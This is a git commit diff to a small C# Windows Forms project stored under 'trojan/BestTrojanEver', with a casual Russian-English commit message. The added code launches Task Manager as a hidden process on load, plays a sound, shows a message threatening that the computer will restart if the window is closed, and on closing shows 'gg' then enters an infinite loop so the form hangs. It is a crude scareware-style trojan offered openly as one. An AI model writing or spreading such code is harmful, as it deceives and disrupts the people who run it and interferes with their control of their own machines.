2c0d6110f3d86d688a9365862f73adc2f93702e0
shm3sh <shm3sh@icloud.com>
2023-01-17 18:32:53 +0300

    omg ya geniy
    i made some shit

--- trojan/BestTrojanEver/BestTrojanEver/Form1.cs
+++ trojan/BestTrojanEver/BestTrojanEver/Form1.cs
@@ -8,11 +8,16 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Media;
+using System.Diagnostics;
+using System.Threading;
 
 namespace BestTrojanEver
 {
     public partial class OtrizkaProduction : Form
     {
+        public Thread processSearch;
+        
+
         protected override void OnKeyDown(KeyEventArgs e)
         {
             base.OnKeyDown(e);
@@ -25,14 +30,26 @@ namespace BestTrojanEver
         public OtrizkaProduction()
         {
             InitializeComponent();
+            processSearch = new Thread(() =>
+            {
+                Process flash = new Process();
+                flash.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                flash.StartInfo.FileName = @"C:\Windows\System32\Taskmgr.exe";
+                flash.Start();
+                flash.Close();
+            });
         }
-
         private void OtrizkaProduction_Load(object sender, EventArgs e)
         {
             System.Media.SoundPlayer mainSound = new System.Media.SoundPlayer(@"music.wav");
             mainSound.Play();
-
-            MessageBox.Show("При открытии диспетчера задач компик перезапустится <3");
+            processSearch.Start();
+            MessageBox.Show("если закрыть дору,компик перезапуститься <3");
+        }
+        protected override void OnFormClosing(FormClosingEventArgs e)
+        {
+            MessageBox.Show("gg");
+            while (true) { }
         }
     }
 }
